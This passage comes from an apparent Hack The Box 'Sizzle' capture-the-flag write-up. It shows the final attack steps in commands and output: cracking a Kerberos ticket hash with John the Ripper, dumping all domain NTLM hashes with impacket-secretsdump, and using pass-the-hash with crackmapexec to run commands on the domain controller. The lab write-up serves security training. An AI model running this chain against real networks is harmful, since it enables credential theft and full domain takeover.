Now, we just have to crack the recovered hash offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john mrlky.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)
1g 0:00:00:12 DONE (2022-04-08 15:08) 0.08183g/s 913848p/s 913848c/s 913848C/s Forever3!..FokinovaS1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Nice, we are almost done.

## Дамп хэша администратора

Here, we used [impacket-secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py), another tool from the *Impacket* suite to dump the **Administrator** password using **mrlky** password.

```bash
$ impacket-secretsdump -just-dc-ntlm mrlky:Football#7@10.129.250.238
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:4a175996452885f5741833c9f110c61f:::
[*] Cleaning up...
```

Perfect, now we can use this NTLM hash to perform a *Pass the Hash* attack and read the **first and second flag** from the domain controller.

Note that **Pass the hash** (or *PtH*) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

```bash
$ crackmapexec smb 10.129.250.238 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267 -x "dir c:\Users\mrlky\Desktop\user.txt"
SMB         10.129.250.238  445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.250.238  445    SIZZLE           [+] HTB.LOCAL\Administrator:f6b7160bfc91823792e0ac3a162c9267 (Pwn3d!)
SMB         10.129.250.238  445    SIZZLE           [+] Executed command 
SMB         10.129.250.238  445    SIZZLE           Volume in drive C has no label.
SMB         10.129.250.238  445    SIZZLE           Volume Serial Number is 9C78-BB37
SMB         10.129.250.238  445    SIZZLE           
SMB         10.129.250.238  445    SIZZLE           Directory of c:\Users\mrlky\Desktop
SMB         10.129.250.238  445    SIZZLE           
SMB         10.129.250.238  445    SIZZLE           06/04/2022  03:38 PM                34 user.txt
SMB         10.129.250.238  445    SIZZLE           1 File(s)             34 bytes
SMB         10.129.250.238  445    SIZZLE           0 Dir(s)  15,061,581,824 bytes free
```

```bash
$ crackmapexec smb 10.129.250.238 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267 -x "dir c:\Users\Administrator\Desktop\root.txt"
SMB         10.129.250.238  445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.250.238  445    SIZZLE           [+] HTB.LOCAL\Administrator:f6b7160bfc91823792e0ac3a162c9267 (Pwn3d!)
SMB         10.129.250.238  445    SIZZLE           [+] Executed command 
SMB         10.129.250.238  445    SIZZLE           Volume in drive C has no label.
SMB         10.129.250.238  445    SIZZLE           Volume Serial Number is 9C78-BB37
SMB         10.129.250.238  445    SIZZLE           
SMB         10.129.250.238  445    SIZZLE           Directory of c:\Users\Administrator\Desktop
SMB         10.129.250.238  445    SIZZLE           
SMB         10.129.250.238  445    SIZZLE           06/04/2022  03:38 PM                34 root.txt
SMB         10.129.250.238  445    SIZZLE           1 File(s)             34 bytes
SMB         10.129.250.238  445    SIZZLE           0 Dir(s)  15,061,581,824 bytes free
```

Awesome! I hope you enjoyed it, I know I did :)
